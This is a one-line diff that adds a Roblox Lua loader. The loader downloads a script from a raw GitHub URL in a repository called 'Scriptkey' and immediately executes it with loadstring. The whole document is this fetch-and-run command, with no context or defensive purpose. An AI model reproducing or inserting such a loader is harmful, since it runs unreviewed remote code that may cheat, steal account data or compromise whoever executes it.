@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/doanhvu339-ux/Scriptkey/refs/heads/main/Key"))()
